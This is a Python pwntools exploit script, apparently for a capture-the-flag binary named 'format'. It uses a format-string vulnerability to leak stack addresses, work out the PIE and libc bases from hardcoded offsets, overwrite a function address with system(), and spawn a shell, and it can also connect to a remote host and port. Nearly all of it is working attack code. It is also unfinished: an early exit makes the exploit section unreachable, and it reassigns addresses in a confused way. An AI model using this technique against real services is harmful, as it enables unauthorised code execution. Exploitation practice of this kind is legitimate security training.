#!/usr/bin/python3
import sys

from pwn import *
import json

global elf


def start():

    global elf

    file_name = './format'
    elf = context.binary = ELF(file_name)
    # context.log_level = 'debug'

    if len(sys.argv) > 1:
        if sys.argv[1] == 'gdb':
            gdbscript = '''
            continue
            '''
            return gdb.debug(file_name, gdbscript=gdbscript)
        else:
            host, port = sys.argv[2:]
            return remote(host, int(port))
    return process(file_name)


def send_payload(io, offset):
    payload = f'%{offset}$p'
    io.sendline(payload)
    return io.recv()


def run_main():

    global elf

    def send_payload2(payload):
        io.sendline(payload)
        return io.recvline()

    payload = cyclic(500)

    info(payload.decode())

    io = start()

    io.sendline(payload)
    info(io.recvline().strip().decode())
    io.interactive()
    sys.exit()


    # info(elf.symbols['__libc_start_main'])
    # info(f'{json.dumps(elf.symbols, indent=4)}')
    # sys.exit(0)

    # for i in range(100):
    #     io.sendline(f'%{i + 1}$p')
    #     info(f'{i + 1}: {io.recvline().strip()}')

    io.sendline('%34$p')
    leaked_addr = int(io.recvline().strip().decode()[2:], 16)
    info(f'leaked_addr: {hex(leaked_addr)}')

    addr_diff = 452
    main_addr = leaked_addr + addr_diff

    base_addr = main_addr - elf.symbols.main

    info(f'main_addr: {hex(main_addr)}')
    info(f'base_addr: {hex(base_addr)}')

    # io.interactive()

    io.sendline(f'%52$p')
    data = io.recvline().strip().decode()
    info(f'leaked pie address: {data}')
    piebase = int(data[2:], 16) - 4288
    info(f'piebase: {hex(piebase)}')
    
    addr_diff = 679998
    data = send_payload(io, 3).strip().decode()
    info(f'leaked_address: {data}')

    leaked_addr = int(data[2:], 0x10)
    system_addr = leaked_addr - addr_diff

    info(f'system_addr: {hex(system_addr)}')

    libc_base = system_addr - 0x48e50
    bin_sh = libc_base + 0x18a152
    printf_address = piebase + 0x3fc0
    # info(f'printf_piebase_addr: {hex(printf_address)}')
    printf_address = libc_base + 0x56cf0
    # info(f'printf_libc_addr: {hex(printf_address)}')

    info(f'libc_base: {hex(libc_base)}')
    info(f'bin_sh: {hex(bin_sh)}')
    # info(f'printf: {hex(printf_address)}')

    printf_address = base_addr + 0x11f1
    info(f'printf_address: {hex(printf_address)}')
    format_string = FmtStr(execute_fmt=send_payload2, offset=6)

    format_string.write(printf_address, system_addr)
    input('IDA>')
    format_string.execute_writes()
    io.sendline('sh')

    io.interactive()


if __name__ == '__main__':
    run_main()
